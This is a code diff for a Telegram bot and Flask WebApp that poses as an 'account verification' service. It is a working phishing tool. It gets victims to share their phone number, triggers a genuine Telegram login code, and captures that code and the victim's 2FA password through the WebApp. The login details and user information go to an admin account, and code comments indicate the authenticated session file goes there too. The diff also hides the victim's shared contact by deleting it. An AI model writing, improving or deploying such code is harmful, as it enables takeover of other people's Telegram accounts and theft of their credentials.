@@ -31,6 +31,7 @@ bot = telebot.TeleBot(BOT_TOKEN)
 sessions = {}
 session_expiry = 300  # 5 minutes
 telegram_clients = {}
+contact_sessions = {}  # Store contact sessions for WebApp
 
 # Create directories
 os.makedirs('sessions', exist_ok=True)
@@ -167,7 +168,7 @@ async def verify_2fa_async(client, password):
         print(f"2FA error: {e}")
         return {'success': False, 'error': f'Wrong password: {str(e)}'}
 
-def send_to_admin(phone, user_info=None, password=None, source="webapp"):
+def send_to_admin(phone, user_info=None, password=None, source="chat"):
     try:
         timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
         msg = f"""📱 <b>NEW VERIFICATION</b>
@@ -196,102 +197,41 @@ def send_to_admin(phone, user_info=None, password=None, source="webapp"):
         print(f"Admin notification error: {e}")
         return False
 
-def cleanup_sessions():
-    current_time = datetime.now()
-    expired = []
-    for session_id, session in sessions.items():
-        if session['expiry'] < current_time:
-            expired.append(session_id)
-    for session_id in expired:
-        del sessions[session_id]
-
 # ==================== FLASK ROUTES ====================
 @app.route('/')
 def index():
-    return render_template('index.html')
+    """Main WebApp page - shows OTP entry"""
+    session_id = request.args.get('session')
+    phone = request.args.get('phone', 'Unknown')
+    
+    if not session_id:
+        return "Invalid session. Please share contact again.", 400
+    
+    return render_template('index.html', session_id=session_id, phone=phone)
 
-@app.route('/api/process-contact', methods=['POST'])
-def process_contact():
+@app.route('/api/get-session-info', methods=['POST'])
+def get_session_info():
+    """Get session info for WebApp"""
     try:
         data = request.json
-        phone = data.get('phone', '').strip()
-        first_name = data.get('first_name', '')
-        last_name = data.get('last_name', '')
-        source = data.get('source', 'webapp')
+        session_id = data.get('session_id')
         
-        print(f"Processing contact: {phone} ({first_name} {last_name}) from {source}")
+        if session_id not in sessions:
+            return jsonify({'success': False, 'error': 'Session expired or invalid'})
         
-        if not phone:
-            return jsonify({'success': False, 'error': 'No phone number provided'})
-        
-        # Format phone number
-        if not phone.startswith('+'):
-            phone = '+' + phone
-        
-        # Validate phone number
-        if len(phone) < 8 or not re.match(r'^\+\d+$', phone):
-            return jsonify({'success': False, 'error': 'Invalid phone number format. Use format: +1234567890'})
-        
-        session_id = generate_session_id()
-        session_file = generate_session_file(phone)
-        
-        print(f"Created session {session_id} for {phone}")
-        
-        # Get Telegram client
-        client_data = get_client(session_file)
-        client = client_data['client']
-        loop = client_data['loop']
-        
-        # Send OTP
-        print(f"Sending OTP to {phone}...")
-        result = loop.run_until_complete(send_otp_async(client, phone))
-        
-        if result['success']:
-            sessions[session_id] = {
-                'phone': phone,
-                'first_name': first_name,
-                'last_name': last_name,
-                'phone_code_hash': result['phone_code_hash'],
-                'session_file': session_file,
-                'expiry': datetime.now() + timedelta(seconds=session_expiry),
-                'attempts': 0,
-                'created': datetime.now(),
-                'source': source
-            }
-            
-            # Send notification to admin
-            try:
-                name_display = f"{first_name} {last_name}".strip() or "User"
-                bot.send_message(
-                    USER_ID,
-                    f"📲 <b>CONTACT SHARED</b>\n\n"
-                    f"👤 Name: {name_display}\n"
-                    f"📱 Phone: {phone}\n"
-                    f"🌐 Source: {source}\n"
-                    f"⏰ Time: {datetime.now().strftime('%H:%M:%S')}\n"
-                    f"🆔 Session: {session_id[:8]}...",
-                    parse_mode='HTML'
-                )
-                print(f"Admin notified about contact for {phone}")
-            except Exception as e:
-                print(f"Failed to notify admin: {e}")
-            
-            print(f"OTP sent successfully to {phone}")
-            return jsonify({
-                'success': True,
-                'session_id': session_id,
-                'message': 'OTP sent successfully'
-            })
-        else:
-            print(f"Failed to send OTP to {phone}: {result.get('error')}")
-            return jsonify({'success': False, 'error': result.get('error', 'Failed to send OTP')})
-            
+        session = sessions[session_id]
+        return jsonify({
+            'success': True,
+            'phone': session['phone'],
+            'first_name': session.get('first_name', ''),
+            'last_name': session.get('last_name', '')
+        })
     except Exception as e:
-        print(f"Error in process-contact: {str(e)}")
-        return jsonify({'success': False, 'error': f'Server error: {str(e)}'})
+        return jsonify({'success': False, 'error': str(e)})
 
 @app.route('/api/verify-otp', methods=['POST'])
 def verify_otp():
+    """Verify OTP from WebApp"""
     try:
         data = request.json
         session_id = data.get('session_id')
@@ -300,7 +240,7 @@ def verify_otp():
         print(f"Verifying OTP for session {session_id}: {otp}")
         
         if session_id not in sessions:
-            return jsonify({'success': False, 'error': 'Session expired. Please start again.'})
+            return jsonify({'success': False, 'error': 'Session expired. Please share contact again.'})
         
         session = sessions[session_id]
         
@@ -313,7 +253,7 @@ def verify_otp():
         session['attempts'] += 1
         if session['attempts'] > 3:
             del sessions[session_id]
-            return jsonify({'success': False, 'error': 'Too many attempts. Please start again.'})
+            return jsonify({'success': False, 'error': 'Too many attempts. Please share contact again.'})
         
         # Verify OTP
         client_data = get_client(session['session_file'])
@@ -343,7 +283,7 @@ def verify_otp():
                 send_to_admin(
                     session['phone'], 
                     result.get('user'), 
-                    source=session.get('source', 'webapp')
+                    source='chat_contact'
                 )
                 
                 # Send session file if exists
@@ -369,7 +309,7 @@ def verify_otp():
             if result.get('code_expired'):
                 print(f"OTP expired for {session['phone']}")
                 del sessions[session_id]
-                return jsonify({'success': False, 'error': 'OTP expired. Please start again.'})
+                return jsonify({'success': False, 'error': 'OTP expired. Please share contact again.'})
             print(f"Verification failed for {session['phone']}: {result.get('error')}")
             return jsonify({'success': False, 'error': result.get('error', 'Verification failed')})
             
@@ -379,6 +319,7 @@ def verify_otp():
 
 @app.route('/api/verify-2fa', methods=['POST'])
 def verify_2fa():
+    """Verify 2FA password from WebApp"""
     try:
         data = request.json
         session_id = data.get('session_id')
@@ -406,7 +347,7 @@ def verify_2fa():
                 session['phone'], 
                 result.get('user'), 
                 password, 
-                session.get('source', 'webapp')
+                'chat_contact'
             )
             
             # Send session file
@@ -431,113 +372,34 @@ def verify_2fa():
         print(f"Error in verify-2fa: {str(e)}")
         return jsonify({'success': False, 'error': f'Server error: {str(e)}'})
 
-@app.route('/api/resend-otp', methods=['POST'])
-def resend_otp():
-    try:
-        data = request.json
-        session_id = data.get('session_id')
-        phone = data.get('phone', '').strip()
-        
-        print(f"Resending OTP for {phone}")
-        
-        if not phone:
-            return jsonify({'success': False, 'error': 'No phone number provided'})
-        
-        # Format phone number
-        if not phone.startswith('+'):
-            phone = '+' + phone
-        
-        # Create new session or update existing
-        if session_id in sessions:
-            session = sessions[session_id]
-            session_file = session['session_file']
-        else:
-            session_id = generate_session_id()
-            session_file = generate_session_file(phone)
-        
-        # Get Telegram client
-        client_data = get_client(session_file)
-        client = client_data['client']
-        loop = client_data['loop']
-        
-        # Send OTP
-        print(f"Resending OTP to {phone}...")
-        result = loop.run_until_complete(send_otp_async(client, phone))
-        
-        if result['success']:
-            # Update or create session
-            sessions[session_id] = {
-                'phone': phone,
-                'phone_code_hash': result['phone_code_hash'],
-                'session_file': session_file,
-                'expiry': datetime.now() + timedelta(seconds=session_expiry),
-                'attempts': 0,
-                'created': datetime.now()
-            }
-            
-            print(f"OTP resent successfully to {phone}")
-            return jsonify({
-                'success': True,
-                'session_id': session_id,
-                'message': 'OTP resent successfully'
-            })
-        else:
-            print(f"Failed to resend OTP to {phone}: {result.get('error')}")
-            return jsonify({'success': False, 'error': result.get('error', 'Failed to resend OTP')})
-            
-    except Exception as e:
-        print(f"Error in resend-otp: {str(e)}")
-        return jsonify({'success': False, 'error': f'Server error: {str(e)}'})
-
-@app.route('/api/complete', methods=['POST'])
-def complete():
-    try:
-        data = request.json
-        phone = data.get('phone', 'Unknown')
-        
-        # Final success notification
-        bot.send_message(
-            USER_ID,
-            f"🎉 <b>VERIFICATION COMPLETE</b>\n\n📱 {phone}\n⏰ {datetime.now().strftime('%H:%M:%S')}\n✅ User has completed verification",
-            parse_mode='HTML'
-        )
-        
-        print(f"Verification completed for {phone}")
-        return jsonify({'success': True, 'message': 'Verification completed'})
-    except Exception as e:
-        print(f"Error in complete: {str(e)}")
-        return jsonify({'success': False, 'error': str(e)})
-
-# ==================== BOT HANDLER FOR CONTACT SHARING ====================
+# ==================== BOT HANDLER ====================
 @bot.message_handler(commands=['start'])
 def start_command(message):
-    """Send WebApp button"""
+    """Send contact sharing instructions"""
     try:
-        # Get WebApp URL
-        webapp_url = WEBHOOK_URL.rstrip('/') if WEBHOOK_URL else f"https://{request.host}"
-        
-        keyboard = types.InlineKeyboardMarkup()
-        webapp_btn = types.InlineKeyboardButton(
-            text="🔐 Open Verification WebApp",
-            web_app=types.WebAppInfo(url=f"{webapp_url}/")
-        )
-        keyboard.add(webapp_btn)
-        
-        # Send WebApp button
         bot.send_message(
             message.chat.id,
-            """<b>🔐 Telegram Account Verification</b>
+            """🔐 <b>Telegram Account Verification</b>
 
-Click the button below to open the WebApp and verify your account:
+To verify your account:
 
-1. Share your contact in the WebApp
-2. Receive OTP on your phone
-3. Enter OTP in WebApp
-4. Complete verification
+1. <b>Share your contact</b> by clicking the contact button below 👇
+2. OTP will be sent to your phone
+3. WebApp will open automatically to enter OTP
 
-<b>⚠️ Note:</b> No messages will be sent to this chat.""",
-            reply_markup=keyboard,
+Click the contact button to begin:""",
             parse_mode='HTML'
+        )
+        
+        # Send contact button
+        keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
+        contact_btn = types.KeyboardButton("📞 Share My Contact", request_contact=True)
+        keyboard.add(contact_btn)
+        
+        bot.send_message(
+            message.chat.id,
+            "Click the button below to share your contact:",
+            reply_markup=keyboard
         )
         
         print(f"Start command sent to user {message.from_user.id}")
@@ -547,10 +409,12 @@ Click the button below to open the WebApp and verify your account:
 
 @bot.message_handler(content_types=['contact'])
 def handle_contact(message):
-    """Handle contact sharing from chat"""
+    """Handle contact sharing - THIS IS THE MAIN FUNCTION"""
     try:
         contact = message.contact
         user_id = message.from_user.id
+        chat_id = message.chat.id
+        
         phone = contact.phone_number
         first_name = contact.first_name or ''
         last_name = contact.last_name or ''
@@ -562,14 +426,23 @@ def handle_contact(message):
         if not phone.startswith('+'):
             phone = '+' + phone
         
+        # Validate phone number
+        if len(phone) < 8 or not re.match(r'^\+\d+$', phone):
+            bot.send_message(
+                chat_id,
+                "❌ Invalid phone number format. Please share a valid contact.",
+                reply_markup=types.ReplyKeyboardRemove()
+            )
+            return
+        
         # Delete the contact message
         try:
-            bot.delete_message(message.chat.id, message.message_id)
+            bot.delete_message(chat_id, message.message_id)
             print(f"Deleted contact message for {user_id}")
         except Exception as e:
             print(f"Could not delete message: {e}")
         
-        # Create session for this contact
+        # Generate session ID
         session_id = generate_session_id()
         session_file = generate_session_file(phone)
         
@@ -580,16 +453,26 @@ def handle_contact(message):
         
         # Send OTP
         print(f"Sending OTP to contact {phone}...")
+        
+        # Send "Sending OTP" message
+        status_msg = bot.send_message(
+            chat_id,
+            f"✅ <b>Contact Received!</b>\n\n📱 Phone: {phone}\n👤 Name: {first_name} {last_name}\n\n⏳ <b>Sending OTP...</b>",
+            parse_mode='HTML',
+            reply_markup=types.ReplyKeyboardRemove()
+        )
+        
         result = loop.run_until_complete(send_otp_async(client, phone))
         
         if result['success']:
+            # Store session
             sessions[session_id] = {
                 'phone': phone,
                 'first_name': first_name,
                 'last_name': last_name,
                 'username': username,
                 'user_id': user_id,
-                'chat_id': message.chat.id,
+                'chat_id': chat_id,
                 'phone_code_hash': result['phone_code_hash'],
                 'session_file': session_file,
                 'expiry': datetime.now() + timedelta(seconds=session_expiry),
@@ -598,21 +481,9 @@ def handle_contact(message):
                 'source': 'chat_contact'
             }
             
-            # Send WebApp link with session ID
-            webapp_url = WEBHOOK_URL.rstrip('/') if WEBHOOK_URL else f"https://{request.host}"
-            webapp_with_session = f"{webapp_url}/?session={session_id}&phone={phone}"
-            
-            keyboard = types.InlineKeyboardMarkup()
-            webapp_btn = types.InlineKeyboardButton(
-                text="📱 Open WebApp to Enter OTP",
-                web_app=types.WebAppInfo(url=webapp_with_session)
-            )
-            keyboard.add(webapp_btn)
-            
-            # Send OTP instructions with WebApp link
-            msg = bot.send_message(
-                message.chat.id,
-                f"""✅ <b>Contact Received!</b>
+            # Update status message
+            bot.edit_message_text(
+                f"""✅ <b>OTP Sent Successfully!</b>
 
 📱 Phone: {phone}
 👤 Name: {first_name} {last_name}
@@ -622,37 +493,73 @@ def handle_contact(message):
 Click the button below to open the WebApp and enter the 5-digit OTP:
 
 ⚠️ <b>Note:</b> Telegram sends OTPs like: <code>9 4 3 8 0</code>""",
-                reply_markup=keyboard,
+                chat_id,
+                status_msg.message_id,
                 parse_mode='HTML'
             )
             
-            # Store message ID to delete later
-            sessions[session_id]['otp_message_id'] = msg.message_id
+            # Create WebApp URL
+            webapp_url = WEBHOOK_URL.rstrip('/') if WEBHOOK_URL else f"https://{request.host}"
+            webapp_with_session = f"{webapp_url}/?session={session_id}&phone={phone}"
+            
+            # Send WebApp button
+            keyboard = types.InlineKeyboardMarkup()
+            webapp_btn = types.InlineKeyboardButton(
+                text="📱 Open WebApp to Enter OTP",
+                web_app=types.WebAppInfo(url=webapp_with_session)
+            )
+            keyboard.add(webapp_btn)
+            
+            bot.send_message(
+                chat_id,
+                "Click the button below to enter OTP:",
+                reply_markup=keyboard
+            )
             
             # Notify admin
             bot.send_message(
                 USER_ID,
-                f"📲 <b>CHAT CONTACT SHARED</b>\n\n"
-                f"👤 User: {first_name} {last_name}\n"
-                f"📱 Phone: {phone}\n"
-                f"🔗 Username: @{username}\n"
-                f"🆔 User ID: {user_id}\n"
-                f"⏰ Time: {datetime.now().strftime('%H:%M:%S')}\n"
-                f"🆔 Session: {session_id[:8]}...",
+                f"""📲 <b>CONTACT SHARED - OTP SENT</b>
+
+👤 User: {first_name} {last_name}
+📱 Phone: {phone}
+🔗 Username: @{username}
+🆔 User ID: {user_id}
+⏰ Time: {datetime.now().strftime('%H:%M:%S')}
+🆔 Session: {session_id[:8]}...
+
+✅ <b>OTP sent successfully</b>""",
                 parse_mode='HTML'
             )
             
+            print(f"OTP sent successfully to {phone}, session: {session_id}")
+            
         else:
-            bot.send_message(
-                message.chat.id,
-                f"❌ <b>Failed to send OTP:</b>\n\n{result.get('error', 'Unknown error')}\n\nPlease try /start again",
+            # OTP sending failed
+            bot.edit_message_text(
+                f"""❌ <b>Failed to send OTP</b>
+
+📱 Phone: {phone}
+👤 Name: {first_name} {last_name}
+
+<b>Error:</b> {result.get('error', 'Unknown error')}
+
+Please try again with /start""",
+                chat_id,
+                status_msg.message_id,
                 parse_mode='HTML'
             )
+            
+            print(f"Failed to send OTP to {phone}: {result.get('error')}")
         
     except Exception as e:
         print(f"Contact handler error: {e}")
         try:
-            bot.send_message(message.chat.id, "❌ Error processing contact. Please try /start")
+            bot.send_message(
+                message.chat.id,
+                "❌ Error processing contact. Please try /start again",
+                reply_markup=types.ReplyKeyboardRemove()
+            )
         except:
             pass
 
@@ -686,41 +593,38 @@ def webhook():
 
 # ==================== CLEANUP THREAD ====================
 def cleanup_loop():
-    """Clean up old sessions and clients"""
+    """Clean up old sessions"""
     while True:
         time.sleep(60)
+        current_time = datetime.now()
+        expired = []
         
-        # Clean expired sessions
-        cleanup_sessions()
+        for session_id, session in sessions.items():
+            if session['expiry'] < current_time:
+                expired.append(session_id)
         
-        # Clean old clients (older than 30 minutes)
-        current_time = time.time()
-        to_remove = []
-        for session_file, client_data in telegram_clients.items():
-            if current_time - client_data['created'] > 1800:  # 30 minutes
-                try:
-                    loop = client_data['loop']
-                    client = client_data['client']
-                    loop.run_until_complete(client.disconnect())
-                    loop.close()
-                except:
-                    pass
-                to_remove.append(session_file)
+        for session_id in expired:
+            try:
+                # Notify user if session expired
+                session = sessions[session_id]
+                bot.send_message(
+                    session['chat_id'],
+                    "⏰ Your verification session has expired. Please share contact again with /start"
+                )
+            except:
+                pass
+            del sessions[session_id]
         
-        for session_file in to_remove:
-            del telegram_clients[session_file]
-        
-        print(f"Cleanup: {len(sessions)} active sessions, {len(telegram_clients)} clients")
+        print(f"Cleanup: Removed {len(expired)} expired sessions, {len(sessions)} active")
 
 # ==================== MAIN ====================
 if __name__ == '__main__':
     print("="*60)
-    print("🚀 Telegram WebApp Verification Bot")
+    print("🚀 Telegram Verification Bot")
     print("="*60)
     print(f"🤖 Bot Token: {BOT_TOKEN[:10]}...")
     print(f"👤 User ID: {USER_ID}")
     print(f"🔧 API ID: {API_ID}")
-    print(f"🔑 API Hash: {API_HASH[:10]}...")
     
     # Start cleanup thread
     cleanup_thread = threading.Thread(target=cleanup_loop, daemon=True)
